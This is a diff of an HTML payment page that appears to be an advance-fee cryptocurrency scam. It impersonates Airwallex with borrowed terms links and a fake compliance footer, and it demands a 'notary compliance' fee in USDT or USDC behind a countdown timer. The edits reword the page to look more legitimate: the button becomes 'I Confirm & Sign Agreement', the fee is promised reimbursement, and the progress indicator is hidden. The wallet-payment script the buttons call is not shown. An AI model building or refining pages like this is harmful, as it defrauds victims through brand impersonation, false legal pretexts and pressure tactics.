@@ -771,7 +771,7 @@ CROP MODAL
 
     <div class="document-card">
         
-      <div class="header">
+            <div class="header">
         <span class="badge">Action Required</span>
       </div>
 
@@ -779,7 +779,7 @@ CROP MODAL
       <div class="glass-card neon-card" id="confirmationCard" style="margin:0 auto 20px auto;">
         <div class="checkbox-container">
           <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
-          <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: var(--text-muted); display: block; text-align: left;">
+          <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
 
             <span style="  
               display: block;  
@@ -788,9 +788,9 @@ CROP MODAL
               border-left: 3px solid rgba(200, 50, 80, 0.85);  
               color: rgba(255, 255, 255, 0.85);  
               font-size: 10px;
-              font-weight: bold; 
+              
             ">  
-              Standard cross-border notary compliance regulations mandate the following additional refundable protocol to officially notarize and register the <strong>Visual Architecture Suite (Phase 1)</strong> agreement executed by both parties.
+              Pursuant to the client's signature, standard cross-border notary compliance regulations mandate the following additional protocol, executed by the Strategic Partner to officially notarize and register this <strong>Visual Architecture Suite (Phase 1)</strong> agreement, subject to full reimbursement upon project completion.
             </span>
 
           </label>
@@ -815,7 +815,7 @@ CROP MODAL
 
         <div class="amount-section">
           <p>Required Legal Amount</p>
-          <p class="amount" id="usdt-amount">119.2037</p>
+          <p class="amount" id="usdt-amount"></p>
         </div>
 
         <div class="wallet-section">
@@ -831,12 +831,20 @@ CROP MODAL
 
         <div class="walletconnect-actions">
           <button id="walletPayBtnUsdt" class="wallet-btn" onclick="handlePayClick()">
-            Verify & Process Payout 
+            I Confirm & Sign Agreement 
           </button>
         </div>
+
+<div class="terms-disclosure" style="font-size: 12px; color: #666; text-align: center; margin-top: 10px;">
+  By clicking the button, you agree to Airwallex's 
+  <a href="https://www.airwallex.com/terms" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Terms of Service</a> 
+  and 
+  <a href="https://www.airwallex.com/global/blog/net-payment-terms" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Payment Terms</a>.
+</div>
+
         <p id="usdt-timer">Verification expires in 05:00</p>
 
-        <div class="progress-bar">
+        <div class="progress-bar" style="display: none;">
           <div class="progress-fill" id="usdt-progress"></div>
           <div class="status" id="usdt-status">Waiting for verification...</div>
         </div>
@@ -854,7 +862,7 @@ CROP MODAL
 
         <div class="amount-section">
           <p>Required Legal Amount</p>
-          <p class="amount" id="usdc-amount">119.2037</p>
+          <p class="amount" id="usdc-amount"></p>
         </div>
 
         <div class="wallet-section">
@@ -870,22 +878,28 @@ CROP MODAL
 
         <div class="walletconnect-actions">
           <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handlePayClick()">
-            Verify & Process Payout  
+            I Confirm & Sign Agreement 
           </button>
         </div>
+<div class="terms-disclosure" style="font-size: 12px; color: #666; text-align: center; margin-top: 10px;">
+  By clicking the button, you agree to Airwallex's 
+  <a href="https://www.airwallex.com/terms" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Terms of Service</a> 
+  and 
+  <a href="https://www.airwallex.com/global/blog/net-payment-terms" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Payment Terms</a>.
+</div>
         <p id="usdc-timer">Verification expires in 05:00</p>
 
-        <div class="progress-bar">
+        <div class="progress-bar" style="display: none;">
           <div class="progress-fill" id="usdc-progress"></div>
           <div class="status" id="usdc-status">Waiting for verification...</div>
         </div>
       </div>
 
       <!-- Footer Note Paired at the Bottom -->
-<div class="footer-note" style="text-align: center; margin-top: 20px;">
+      <div class="footer-note" style="text-align: center; margin-top: 20px;">
     <img src="assets/pictures/download (1).png" alt="Profile" class="security-avatar">
-    Airwallex • Security Protocol SSL-256
-</div>
+          Airwallex • SOC2 Compliance Protocol 
+      </div>
 
 </body>
 <script>
